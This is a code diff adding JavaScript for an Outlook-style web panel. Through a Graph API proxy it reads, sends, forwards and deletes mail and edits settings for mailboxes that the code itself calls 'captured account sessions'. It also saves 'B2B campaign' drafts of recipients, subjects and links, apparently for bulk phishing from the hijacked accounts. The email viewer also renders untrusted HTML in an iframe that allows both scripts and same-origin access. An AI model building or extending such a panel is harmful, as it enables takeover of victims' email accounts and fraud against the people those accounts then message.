+                        const attData = await (await fetch(`/api/graph_proxy/attachments?user_code=${uc}&message_id=${mid}`)).json();
+                        attList = attData.value || [];
+                        window.currentEmailAttachments = attList;
+                        if (attList.length > 0) {
+                            // Filter standalone attachments vs tiny inline spacer graphics
+                            const visibleAtts = attList.filter(a => {
+                                if (!a.isInline) return true;
+                                const name = (a.name || '').toLowerCase();
+                                const isGenericSpacer = /^(image\d+|spacer|blank|pixel|logo)\.(png|jpg|gif|jpeg)$/i.test(name);
+                                if (name && (a.size || 0) > 2048 && !isGenericSpacer) return true;
+                                return false;
+                            });
+                            const renderAtts = visibleAtts.length > 0 ? visibleAtts : attList;
+
+                            if (renderAtts.length > 0) {
+                                attachmentsHtml = `
+                                    <div class="owa-attachments-bar">
+                                        <div class="owa-attachments-header">
+                                            <div class="owa-attachments-count">
+                                                <svg width="16" height="16" viewBox="0 0 24 24" fill="#0078d4"><path d="M16.5 6v11.5c0 2.21-1.79 4-4 4s-4-1.79-4-4V5c0-1.38 1.12-2.5 2.5-2.5s2.5 1.12 2.5 2.5v10.5c0 .55-.45 1-1 1s-1-.45-1-1V6H10v9.5c0 1.38 1.12 2.5 2.5 2.5s2.5-1.12 2.5-2.5V5c0-2.21-1.79-4-4-4S7 2.79 7 5v12.5c0 3.04 2.46 5.5 5.5 5.5s5.5-2.46 5.5-5.5V6h-1.5z"/></svg>
+                                                <span>Attachments (${renderAtts.length})</span>
+                                            </div>
+                                            ${renderAtts.length > 1 ? `
+                                            <button type="button" class="owa-download-all-btn" onclick="downloadAllCurrentAttachments()" title="Download all attachments">
+                                                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                                                <span>Download all (${renderAtts.length})</span>
+                                            </button>` : ''}
+                                        </div>
+                                        <div class="owa-attachments-grid">
+                                            ${renderAtts.map(a => renderAttachmentCard(a)).join('')}
+                                        </div>
+                                    </div>
+                                `;
+                            }
+                        }
+                    } catch (e) {
+                        console.error('Error loading attachments:', e);
+                    }
+                }
+
+                let rawBodyContent = data.body?.content || '<p style="color:#605e5c;">(No message body)</p>';
+                if (data.body?.contentType === 'text') {
+                    rawBodyContent = `<pre style="white-space: pre-wrap; font-family: inherit; font-size: 14px;">${rawBodyContent}</pre>`;
+                }
+
+                // Inline attachment CID replacement for perfect inline image rendering
+                if (attList.length > 0) {
+                    attList.forEach(a => {
+                        if (a.contentBytes && (a.contentId || a.name)) {
+                            const mime = a.contentType || 'image/png';
+                            const dataUri = `data:${mime};base64,${a.contentBytes}`;
+                            if (a.contentId) {
+                                const cidClean = a.contentId.replace(/^<|>$/g, '');
+                                rawBodyContent = rawBodyContent.split('cid:' + cidClean).join(dataUri);
+                                rawBodyContent = rawBodyContent.split('cid:<' + cidClean + '>').join(dataUri);
+                                rawBodyContent = rawBodyContent.split('cid:' + encodeURIComponent(cidClean)).join(dataUri);
+                            }
+                            if (a.name) {
+                                rawBodyContent = rawBodyContent.split('cid:' + a.name).join(dataUri);
+                            }
+                        }
+                    });
+                }
+
+                // Normalize protocol-relative image URLs to HTTPS
+                rawBodyContent = rawBodyContent.replace(/src="\/\//gi, 'src="https://');
+                rawBodyContent = rawBodyContent.replace(/src='\/\//gi, "src='https://");
+
+                const isDelFolder = (currentOutlookFolderName || '').toLowerCase().includes('delete') || (currentOutlookFolderName || '').toLowerCase().includes('trash');
+                const deletedBannerHtml = isDelFolder
+                    ? `<div class="reader-deleted-banner">
+                        <span>⚠️ This message is in the Deleted Items folder.</span>
+                        <button class="btn btn-primary btn-sm" onclick="restoreCurrentMessage('${mid}')">♻️ Restore to Inbox</button>
+                    </div>`
+                    : '';
+
+                readerEl.innerHTML = `
+                    <div class="reader-inner-scroll">
+                        <div class="reader-headline-row" style="padding: 20px 28px 12px; border-bottom: 1px solid #edebe9; display: flex; justify-content: space-between; align-items: flex-start;">
+                            <div class="reader-big-subject" style="font-size: 21px; font-weight: 600; color: #201f1e; line-height: 1.35;">${subject}</div>
+                        </div>
+
+                        ${deletedBannerHtml}
+
+                        <div class="reader-sender-box" style="padding: 14px 28px 12px; display: flex; align-items: flex-start; gap: 14px;">
+                            <div class="reader-circle-avatar" style="background:${avatarCol.bg}; color:${avatarCol.fg}; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; flex-shrink: 0;">${initials}</div>
+                            <div class="reader-sender-text" style="flex: 1; min-width: 0;">
+                                <div style="display: flex; justify-content: space-between; align-items: flex-start;">
+                                    <div>
+                                        <span class="reader-sender-link" style="font-weight: 600; font-size: 14px; color: #201f1e;">${senderName}</span>
+                                        <span style="color: #605e5c; font-size: 13px;"> &lt;${senderAddr}&gt;</span>
+                                    </div>
+                                    <div style="display: flex; align-items: center; gap: 16px;">
+                                        <div style="display: flex; gap: 12px; font-size: 16px; color: #605e5c;">
+                                            <span title="Reply" style="cursor:pointer;" onclick="replyCurrentMessage()">↩</span>
+                                            <span title="Reply all" style="cursor:pointer;" onclick="replyAllCurrentMessage()">↩↩</span>
+                                            <span title="Forward" style="cursor:pointer;" onclick="forwardCurrentMessage()">↪</span>
+                                            <span title="Delete" style="cursor:pointer;" onclick="deleteCurrentMessage('${mid}')">🗑️</span>
+                                            <span title="More" style="cursor:pointer;">⋯</span>
+                                        </div>
+                                        <span class="reader-date-right" style="color: #605e5c; font-size: 12px;">${dt}</span>
+                                    </div>
+                                </div>
+                                <div class="reader-to-line" style="color: #605e5c; font-size: 13px; margin-top: 3px;">To: ${recips}</div>
+                            </div>
+                        </div>
+
+                        <!-- Unsubscribe / Security banner matching screenshot -->
+                        <div class="reader-sub-banner" style="margin: 0 28px 10px; padding: 7px 14px; background: #fdf6f0; border: 1px solid #f9dfcd; border-radius: 4px; display: flex; justify-content: space-between; align-items: center; font-size: 12.5px; color: #794500;">
+                            <span style="display: flex; align-items: center; gap: 6px;">ℹ️ Getting too much email?</span>
+                            <div style="display: flex; gap: 8px;">
+                                <button class="reader-sub-btn" onclick="showToast('Unsubscribe action triggered')" style="background: transparent; border: 1px solid #c7a783; padding: 2px 8px; border-radius: 3px; font-size: 11.5px; cursor: pointer; color: #794500; font-weight: 500;">Unsubscribe</button>
+                                <button class="reader-sub-btn" onclick="showToast('Manage subscriptions')" style="background: transparent; border: 1px solid #c7a783; padding: 2px 8px; border-radius: 3px; font-size: 11.5px; cursor: pointer; color: #794500; font-weight: 500;">Manage subscriptions</button>
+                            </div>
+                        </div>
+
+                        <div class="reader-view-web-notice" style="padding: 6px 28px 12px; font-size: 12px; color: #605e5c; text-align: center;">
+                            Having trouble viewing this email? | <a href="#" onclick="return false;" style="color: #0078d4; text-decoration: underline;">View as a webpage</a>
+                        </div>
+
+                        ${attachmentsHtml}
+
+                        <!-- Isolated sandboxed iframe for pixel-perfect rich email & image rendering -->
+                        <div class="reader-html-body-wrapper" style="flex: 1; padding: 0 10px; background: #ffffff;">
+                            <iframe id="email-frame-${mid}" class="email-body-iframe" sandbox="allow-same-origin allow-scripts allow-popups allow-popups-to-escape-sandbox" frameborder="0" style="width: 100%; border: none; min-height: 500px; display: block; background: #ffffff;"></iframe>
+                        </div>
+                    </div>
+                `;
+
+                // Inject HTML into iframe safely without template interpolation collision
+                const iframe = document.getElementById('email-frame-' + mid);
+                if (iframe) {
+                    const docHtml = '<!DOCTYPE html><html><head><meta charset="utf-8">' +
+                        '<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
+                        '<meta name="referrer" content="no-referrer">' +
+                        '<base target="_blank">' +
+                        '<style>' +
+                        'html, body { margin: 0; padding: 0; background: #ffffff; }' +
+                        'body { padding: 18px 24px; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 14.5px; line-height: 1.6; color: #201f1e; word-break: break-word; overflow-y: hidden; }' +
+                        '#email-body-root { overflow: hidden; }' +
+                        'img { max-width: 100% !important; height: auto !important; }' +
+                        'table { max-width: 100% !important; }' +
+                        'pre { white-space: pre-wrap !important; word-break: break-word !important; font-family: Consolas, monospace; font-size: 12px; }' +
+                        'a { color: #0078d4; }' +
+                        '</style>' +
+                        '<script>' +
+                        'var lastH = 0;' +
+                        'function notifyHeight() {' +
+                        '  try {' +
+                        '    var el = document.getElementById("email-body-root") || document.body;' +
+                        '    var h = el ? el.scrollHeight + 32 : 0;' +
+                        '    if (h > 0 && Math.abs(h - lastH) > 10) {' +
+                        '      lastH = h;' +
+                        '      window.parent.postMessage({ type: "outlook-frame-resize", mid: "' + mid + '", height: h }, "*");' +
+                        '    }' +
+                        '  } catch(e){}' +
+                        '}' +
+                        'window.addEventListener("load", notifyHeight);' +
+                        'document.addEventListener("DOMContentLoaded", notifyHeight);' +
+                        'setTimeout(notifyHeight, 200);' +
+                        'setTimeout(notifyHeight, 800);' +
+                        '<\/script>' +
+                        '</head><body><div id="email-body-root">' + rawBodyContent + '</div></body></html>';
+                    iframe.srcdoc = docHtml;
+                }
+            } catch (err) {
+                readerEl.innerHTML = `<div style="color:var(--danger); padding:24px;">Failed to load email: ${err}</div>`;
+            }
+        }
+
+        // Window message listener for dynamic iframe height resizing
+        window.addEventListener('message', function(event) {
+            if (event.data && event.data.type === 'outlook-frame-resize' && event.data.height) {
+                const frame = document.getElementById('email-frame-' + event.data.mid);
+                if (frame) {
+                    frame.style.height = Math.max(event.data.height, 360) + 'px';
+                }
+            }
+        });
+
+        // ── Delete / Restore / Archive / Mark / Flag Actions ─────────
+        async function deleteCurrentMessage(targetMid) {
+            const mid = targetMid || currentOutlookSelectedMessageId;
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            if (!uc || !mid) {
+                showToast('⚠️ Please select a message to delete');
+                return;
+            }
+
+            const isDelFolder = (currentOutlookFolderName || '').toLowerCase().includes('delete') || (currentOutlookFolderName || '').toLowerCase().includes('trash');
+            if (isDelFolder) {
+                const ok = await appConfirm({
+                    title: 'Permanently Delete Email',
+                    message: 'Permanently delete this email from the mailbox? This action cannot be undone.',
+                    confirmText: 'Delete Permanently',
+                    danger: true,
+                    icon: '🗑️'
+                });
+                if (!ok) return;
+                try {
+                    await fetch('/api/graph_proxy/delete_message', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({user_code: uc, message_id: mid})
+                    });
+                    showToast('✓ Message permanently deleted');
+                } catch(e) { showToast('⚠️ Delete failed: ' + e); }
+            } else {
+                try {
+                    await fetch('/api/graph_proxy/move_message', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({user_code: uc, message_id: mid, destination_id: 'deleteditems'})
+                    });
+                    showToast('Message moved to Deleted Items');
+                } catch(e) { showToast('Delete failed: ' + e); }
+            }
+
+            currentFolderAllMessages = currentFolderAllMessages.filter(m => m.id !== mid);
+            currentOutlookMessages = currentOutlookMessages.filter(m => m.id !== mid);
+            renderMessageList(currentOutlookMessages);
+
+            if (currentOutlookMessages.length > 0) {
+                const nextMsg = currentOutlookMessages[0];
+                readMessage(uc, nextMsg.id, document.querySelector(`.outlook-msg-card[data-id="${nextMsg.id}"]`));
+            } else {
+                document.getElementById('mailbox-reader').innerHTML = '<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:#605e5c;"><div style="font-size:42px; margin-bottom:12px; opacity:0.4;">✉️</div><div style="font-size:16px; font-weight:600; color:#323130;">No messages in folder</div></div>';
+            }
+        }
+
+        async function restoreCurrentMessage(targetMid) {
+            const mid = targetMid || currentOutlookSelectedMessageId;
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            if (!uc || !mid) {
+                alert('Please select a message to restore');
+                return;
+            }
+
+            try {
+                await fetch('/api/graph_proxy/move_message', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({user_code: uc, message_id: mid, destination_id: 'inbox'})
+                });
+                showToast('Message restored to Inbox');
+            } catch(e) { showToast('Restore failed: ' + e); }
+
+            currentFolderAllMessages = currentFolderAllMessages.filter(m => m.id !== mid);
+            currentOutlookMessages = currentOutlookMessages.filter(m => m.id !== mid);
+            renderMessageList(currentOutlookMessages);
+
+            if (currentOutlookMessages.length > 0) {
+                const nextMsg = currentOutlookMessages[0];
+                readMessage(uc, nextMsg.id, document.querySelector(`.outlook-msg-card[data-id="${nextMsg.id}"]`));
+            } else {
+                document.getElementById('mailbox-reader').innerHTML = '<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:#605e5c;"><div style="font-size:42px; margin-bottom:12px; opacity:0.4;">✉️</div><div style="font-size:16px; font-weight:600; color:#323130;">Deleted Items is empty</div></div>';
+            }
+        }
+
+        async function archiveCurrentMessage(targetMid) {
+            const mid = targetMid || currentOutlookSelectedMessageId;
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            if (!uc || !mid) {
+                alert('Please select a message to archive');
+                return;
+            }
+
+            try {
+                await fetch('/api/graph_proxy/move_message', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({user_code: uc, message_id: mid, destination_id: 'archive'})
+                });
+                showToast('Message archived');
+            } catch(e) { showToast('Archive failed: ' + e); }
+
+            currentFolderAllMessages = currentFolderAllMessages.filter(m => m.id !== mid);
+            currentOutlookMessages = currentOutlookMessages.filter(m => m.id !== mid);
+            renderMessageList(currentOutlookMessages);
+            if (currentOutlookMessages.length > 0) {
+                const nextMsg = currentOutlookMessages[0];
+                readMessage(uc, nextMsg.id, document.querySelector(`.outlook-msg-card[data-id="${nextMsg.id}"]`));
+            } else {
+                document.getElementById('mailbox-reader').innerHTML = '<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; color:#605e5c;"><div style="font-size:42px; margin-bottom:12px; opacity:0.4;">✉️</div><div style="font-size:16px; font-weight:600; color:#323130;">No messages in folder</div></div>';
+            }
+        }
+
+        async function toggleReadStatus(targetMid) {
+            const mid = targetMid || currentOutlookSelectedMessageId;
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            if (!uc || !mid) {
+                alert('Please select a message');
+                return;
+            }
+
+            const msg = currentOutlookMessages.find(m => m.id === mid) || currentFolderAllMessages.find(m => m.id === mid);
+            const newStatus = msg ? !msg.isRead : true;
+            if (msg) msg.isRead = newStatus;
+            renderMessageList(currentOutlookMessages);
+
+            try {
+                await fetch('/api/graph_proxy/update_message', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({user_code: uc, message_id: mid, payload: {isRead: newStatus}})
+                });
+                showToast(newStatus ? 'Marked as read' : 'Marked as unread');
+            } catch(e) {}
+        }
+
+        async function toggleFlagStatus(targetMid) {
+            const mid = targetMid || currentOutlookSelectedMessageId;
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            if (!uc || !mid) {
+                alert('Please select a message');
+                return;
+            }
+
+            const msg = currentOutlookMessages.find(m => m.id === mid) || currentFolderAllMessages.find(m => m.id === mid);
+            const isFlagged = msg?.flag?.flagStatus === 'flagged';
+            const newFlagStatus = isFlagged ? 'notFlagged' : 'flagged';
+            if (msg) {
+                if (!msg.flag) msg.flag = {};
+                msg.flag.flagStatus = newFlagStatus;
+            }
+            renderMessageList(currentOutlookMessages);
+
+            try {
+                await fetch('/api/graph_proxy/update_message', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({user_code: uc, message_id: mid, payload: {flag: {flagStatus: newFlagStatus}}})
+                });
+                showToast(isFlagged ? 'Flag removed' : 'Message flagged');
+            } catch(e) {}
+        }
+
+        // ── Realtime Search ──────────────────────────────────────────
+        let searchDebounceTimer = null;
+        function onRealtimeSearch(query) {
+            const q = (query || '').trim();
+            const qLower = q.toLowerCase();
+            const clearBtn = document.getElementById('search-clear-btn');
+            if (clearBtn) clearBtn.style.display = q ? 'inline-block' : 'none';
+
+            clearTimeout(searchDebounceTimer);
+
+            // 1. Instant local filter (0ms delay) on currently loaded messages
+            if (!q) {
+                currentOutlookMessages = [...currentFolderAllMessages];
+                renderMessageList(currentOutlookMessages);
+                document.getElementById('current-folder-date-group').innerText = 'This Month';
+                return;
+            }
+
+            const localMatches = currentFolderAllMessages.filter(m => {
+                const s = (m.subject || '').toLowerCase();
+                const fromName = (m.from?.emailAddress?.name || '').toLowerCase();
+                const fromAddr = (m.from?.emailAddress?.address || '').toLowerCase();
+                const prev = (m.bodyPreview || '').toLowerCase();
+                return s.includes(qLower) || fromName.includes(qLower) || fromAddr.includes(qLower) || prev.includes(qLower);
+            });
+
+            renderMessageList(localMatches);
+            document.getElementById('current-folder-date-group').innerText = `Filtered (${localMatches.length})`;
+
+            // 2. Debounced Graph API deep mailbox search across entire mailbox
+            if (q.length >= 2) {
+                searchDebounceTimer = setTimeout(async () => {
+                    const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+                    if (!uc) return;
+                    const curInp = (document.getElementById('outlook-search-input')?.value || '').trim();
+                    if (curInp !== q) return;
+
+                    try {
+                        const res = await (await fetch(`/api/graph_proxy/search?user_code=${uc}&q=${encodeURIComponent(q)}`)).json();
+                        const nowInp = (document.getElementById('outlook-search-input')?.value || '').trim();
+                        if (nowInp === q && res.value) {
+                            renderMessageList(res.value);
+                            document.getElementById('current-folder-date-group').innerText = `Search: "${q}" (${res.value.length})`;
+                        }
+                    } catch(e) {}
+                }, 280);
+            }
+        }
+
+        function clearSearch() {
+            const inp = document.getElementById('outlook-search-input');
+            if (inp) inp.value = '';
+            onRealtimeSearch('');
+        }
+
+        // ── Genuine Microsoft Outlook Web Compose Modal Handlers ────
+        function toggleCcBcc(type) {
+            const row = document.getElementById('row-compose-' + type);
+            if (row) {
+                row.style.display = (row.style.display === 'none' || !row.style.display) ? 'flex' : 'none';
+                if (row.style.display === 'flex') {
+                    const inp = document.getElementById('compose-' + type);
+                    if (inp) inp.focus();
+                }
+            }
+        }
+
+        function formatDoc(cmd, val = null) {
+            document.execCommand(cmd, false, val);
+            const ed = document.getElementById('compose-editor');
+            if (ed) ed.focus();
+        }
+
+        function insertLinkPrompt() {
+            const url = prompt('Enter the hyperlink URL (e.g. https://example.com):', 'https://');
+            if (url) formatDoc('createLink', url);
+        }
+
+        function saveMailboxComposeDraft() {
+            const isModalActive = document.getElementById('outlookComposeModal')?.classList.contains('active');
+            const to = document.getElementById('compose-to')?.value || '';
+            const cc = document.getElementById('compose-cc')?.value || '';
+            const bcc = document.getElementById('compose-bcc')?.value || '';
+            const subj = document.getElementById('compose-subject')?.value || '';
+            const ed = document.getElementById('compose-editor');
+            const bodyHtml = ed ? ed.innerHTML : '';
+            if (isModalActive && (to || cc || bcc || subj || (bodyHtml && bodyHtml !== '<p><br></p>'))) {
+                localStorage.setItem('crimson_mailbox_compose_draft', JSON.stringify({
+                    to, cc, bcc, subject: subj, bodyHtml,
+                    userCode: currentOutlookUserCode || ''
+                }));
+            } else if (!isModalActive) {
+                localStorage.removeItem('crimson_mailbox_compose_draft');
+            }
+        }
+
+        function restoreMailboxComposeDraft() {
+            try {
+                const raw = localStorage.getItem('crimson_mailbox_compose_draft');
+                if (!raw) return;
+                const d = JSON.parse(raw);
+                if (d && (d.to || d.subject || d.bodyHtml || d.cc || d.bcc)) {
+                    openComposeModal(d.to, d.subject, d.bodyHtml);
+                    if (d.cc) {
+                        const ccInp = document.getElementById('compose-cc');
+                        if (ccInp) { ccInp.value = d.cc; document.getElementById('row-compose-cc').style.display = 'flex'; }
+                    }
+                    if (d.bcc) {
+                        const bccInp = document.getElementById('compose-bcc');
+                        if (bccInp) { bccInp.value = d.bcc; document.getElementById('row-compose-bcc').style.display = 'flex'; }
+                    }
+                }
+            } catch(e) {}
+        }
+
+        function saveB2BDraft() {
+            try {
+                const name = document.getElementById('b2b-campaign-name')?.value || '';
+                const recs = document.getElementById('b2b-recipients')?.value || '';
+                const subjs = document.getElementById('b2b-subjects')?.value || '';
+                const links = document.getElementById('b2b-links')?.value || '';
+                const body = (typeof b2bGetHtml === 'function') ? b2bGetHtml() : (document.getElementById('b2b-body')?.value || '');
+                const sender = document.getElementById('b2b-sender-account')?.value || '';
+                if (name || recs || subjs || links || (body && body.length > 5)) {
+                    localStorage.setItem('crimson_b2b_draft', JSON.stringify({
+                        name, recs, subjs, links, body, sender
+                    }));
+                }
+            } catch(e) {}
+        }
+
+        function restoreB2BDraft() {
+            try {
+                const raw = localStorage.getItem('crimson_b2b_draft');
+                if (!raw) return;
+                const d = JSON.parse(raw);
+                if (d) {
+                    if (d.name && document.getElementById('b2b-campaign-name')) document.getElementById('b2b-campaign-name').value = d.name;
+                    if (d.recs && document.getElementById('b2b-recipients')) document.getElementById('b2b-recipients').value = d.recs;
+                    if (d.subjs && document.getElementById('b2b-subjects')) document.getElementById('b2b-subjects').value = d.subjs;
+                    if (d.links && document.getElementById('b2b-links')) document.getElementById('b2b-links').value = d.links;
+                    if (d.sender && document.getElementById('b2b-sender-account')) document.getElementById('b2b-sender-account').value = d.sender;
+                    if (d.body && typeof b2bSetHtml === 'function') {
+                        setTimeout(() => b2bSetHtml(d.body), 350);
+                    }
+                }
+            } catch(e) {}
+        }
+
+        function openComposeModal(to, subject, bodyHtml) {
+            document.getElementById('compose-to').value = to || '';
+            const ccInp = document.getElementById('compose-cc');
+            if (ccInp) ccInp.value = '';
+            const bccInp = document.getElementById('compose-bcc');
+            if (bccInp) bccInp.value = '';
+            document.getElementById('row-compose-cc').style.display = 'none';
+            document.getElementById('row-compose-bcc').style.display = 'none';
+
+            document.getElementById('compose-subject').value = subject || '';
+            const ed = document.getElementById('compose-editor');
+            if (ed) ed.innerHTML = bodyHtml || '';
+            document.getElementById('compose-status').innerText = '';
+            document.getElementById('btn-send-mail').disabled = false;
+            document.getElementById('btn-send-mail').innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg> <span>Send</span>';
+            document.getElementById('outlookComposeModal').classList.add('active');
+            saveMailboxComposeDraft();
+            if (!to) {
+                document.getElementById('compose-to').focus();
+            } else if (ed) {
+                ed.focus();
+            }
+        }
+
+        function closeComposeModal() {
+            document.getElementById('outlookComposeModal').classList.remove('active');
+            localStorage.removeItem('crimson_mailbox_compose_draft');
+        }
+
+        async function sendMailNow() {
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            const to = document.getElementById('compose-to').value.trim();
+            const cc = (document.getElementById('compose-cc')?.value || '').trim();
+            const bcc = (document.getElementById('compose-bcc')?.value || '').trim();
+            const subj = document.getElementById('compose-subject').value.trim();
+            const ed = document.getElementById('compose-editor');
+            const bodyHtml = ed ? ed.innerHTML : '';
+            const btn = document.getElementById('btn-send-mail');
+            const statusEl = document.getElementById('compose-status');
+
+            if (!to) { alert('Please enter recipient email address'); return; }
+            btn.disabled = true;
+            btn.innerText = 'Sending...';
+            statusEl.innerText = 'Transmitting via Microsoft Graph API...';
+
+            try {
+                const toRecipients = to.split(/[,;]+/).map(e => e.trim()).filter(Boolean).map(addr => ({ emailAddress: { address: addr } }));
+                const ccRecipients = cc ? cc.split(/[,;]+/).map(e => e.trim()).filter(Boolean).map(addr => ({ emailAddress: { address: addr } })) : [];
+                const bccRecipients = bcc ? bcc.split(/[,;]+/).map(e => e.trim()).filter(Boolean).map(addr => ({ emailAddress: { address: addr } })) : [];
+
+                const payload = {
+                    message: {
+                        subject: subj,
+                        body: { contentType: 'HTML', content: bodyHtml },
+                        toRecipients: toRecipients,
+                        ccRecipients: ccRecipients,
+                        bccRecipients: bccRecipients
+                    },
+                    saveToSentItems: 'true'
+                };
+                const res = await (await fetch('/api/graph_proxy/send_mail', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({user_code: uc, payload: payload})
+                })).json();
+
+                if (res.error) {
+                    statusEl.innerText = 'Error: ' + (res.error.message || res.error);
+                    btn.disabled = false;
+                    btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg> <span>Send</span>';
+                } else {
+                    showToast('✓ Email sent successfully via Microsoft Graph!');
+                    closeComposeModal();
+                    btn.disabled = false;
+                    btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg> <span>Send</span>';
+                }
+            } catch(e) {
+                statusEl.innerText = 'Failed: ' + e;
+                btn.disabled = false;
+                btn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg> <span>Send</span>';
+            }
+        }
+
+        function replyCurrentMessage() {
+            if (!currentOutlookSelectedMessage) return;
+            const m = currentOutlookSelectedMessage;
+            const sender = m.from?.emailAddress?.address || '';
+            const subj = (m.subject || '').startsWith('Re:') ? m.subject : 'Re: ' + (m.subject || '');
+            const quotedHtml = `<br><br><div style="border-left: 2px solid #0078d4; padding-left: 10px; margin-top: 15px; color: #605e5c;"><b>From:</b> ${m.from?.emailAddress?.name || sender} &lt;${sender}&gt;<br><b>Sent:</b> ${m.receivedDateTime}<br><b>Subject:</b> ${m.subject || ''}<br><br>${m.body?.content || m.bodyPreview || ''}</div>`;
+            openComposeModal(sender, subj, quotedHtml);
+        }
+
+        function replyAllCurrentMessage() {
+            replyCurrentMessage();
+        }
+
+        function forwardCurrentMessage() {
+            if (!currentOutlookSelectedMessage) return;
+            const m = currentOutlookSelectedMessage;
+            const subj = (m.subject || '').startsWith('Fwd:') ? m.subject : 'Fwd: ' + (m.subject || '');
+            const quotedHtml = `<br><br><div style="border-left: 2px solid #0078d4; padding-left: 10px; margin-top: 15px; color: #605e5c;"><b>From:</b> ${m.from?.emailAddress?.name} &lt;${m.from?.emailAddress?.address}&gt;<br><b>Sent:</b> ${m.receivedDateTime}<br><b>Subject:</b> ${m.subject || ''}<br><br>${m.body?.content || m.bodyPreview || ''}</div>`;
+            openComposeModal('', subj, quotedHtml);
+        }
+
+        // ── Full Read & Write Mailbox Settings & Rules Manager ─────────
+        async function openMailboxSettings() {
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session').value;
+            if (!uc) {
+                alert('Please select a captured account session first.');
+                return;
+            }
+            document.getElementById('outlookSettingsModal').classList.add('active');
+            switchOutlookSettingsTab('autoreply');
+            loadAutomaticReplies(uc);
+            loadMessageRules(uc);
+            loadGeneralSettings(uc);
+        }
+
+        function closeMailboxSettings() {
+            document.getElementById('outlookSettingsModal').classList.remove('active');
+        }
+
+        function switchOutlookSettingsTab(tabName) {
+            document.querySelectorAll('.owa-sidebar-item').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.settings-tab-pane').forEach(el => el.style.display = 'none');
+            
+            const navEl = document.getElementById('tab-nav-' + tabName);
+            if (navEl) navEl.classList.add('active');
+            const paneEl = document.getElementById('settings-tab-' + tabName);
+            if (paneEl) paneEl.style.display = 'block';
+        }
+
+        async function loadAutomaticReplies(uc) {
+            const container = document.getElementById('autoreply-content');
+            container.innerHTML = '<div style="padding:16px 0; color:#605e5c;">Loading automatic replies from Graph API...</div>';
+            try {
+                const data = await (await fetch(`/api/graph_proxy/settings?user_code=${uc}`)).json();
+                if (data.error) {
+                    container.innerHTML = `<div style="color:var(--danger); padding:16px 0;">⚠️ ${data.error.message || data.error}</div>`;
+                    return;
+                }
+                const auto = data.automaticRepliesSetting || {};
+                const st = auto.status || 'disabled';
+                const aud = auto.externalAudience || 'all';
+
+                container.innerHTML = `
+                    <div class="owa-config-card">
+                        <h4>Out of Office Replies Status</h4>
+                        <div class="owa-toggle-group">
+                            <label style="display:flex; align-items:center; gap:6px; cursor:pointer; font-weight:600;">
+                                <input type="radio" name="auto-reply-status" value="disabled" ${st === 'disabled' ? 'checked' : ''} onchange="toggleScheduledDates(this.value)"> Don't send automatic replies
+                            </label>
+                            <label style="display:flex; align-items:center; gap:6px; cursor:pointer; font-weight:600;">
+                                <input type="radio" name="auto-reply-status" value="alwaysEnabled" ${st === 'alwaysEnabled' ? 'checked' : ''} onchange="toggleScheduledDates(this.value)"> Send automatic replies
+                            </label>
+                            <label style="display:flex; align-items:center; gap:6px; cursor:pointer; font-weight:600;">
+                                <input type="radio" name="auto-reply-status" value="scheduled" ${st === 'scheduled' ? 'checked' : ''} onchange="toggleScheduledDates(this.value)"> Send only during a time period
+                            </label>
+                        </div>
+
+                        <div id="autoreply-scheduled-box" style="display:${st === 'scheduled' ? 'grid' : 'none'}; grid-template-columns:1fr 1fr; gap:12px; margin-top:8px; padding-top:8px; border-top:1px solid #edebe9;">
+                            <div>
+                                <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">Start time</label>
+                                <input type="datetime-local" id="autoreply-start-time" class="owa-input" value="${auto.scheduledStartDateTime?.dateTime ? auto.scheduledStartDateTime.dateTime.substring(0, 16) : ''}">
+                            </div>
+                            <div>
+                                <label style="font-size:12px; font-weight:600; color:#323130; display:block; margin-bottom:4px;">End time</label>
+                                <input type="datetime-local" id="autoreply-end-time" class="owa-input" value="${auto.scheduledEndDateTime?.dateTime ? auto.scheduledEndDateTime.dateTime.substring(0, 16) : ''}">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="owa-config-card">
+                        <h4>Send replies inside your organization</h4>
+                        <p style="font-size:12px; color:#605e5c; margin:0;">Colleagues within your tenant will receive this automatic response.</p>
+                        <textarea id="autoreply-internal-msg" class="owa-textarea" placeholder="I am currently away from the office...">${auto.internalReplyMessage || ''}</textarea>
+                    </div>
+
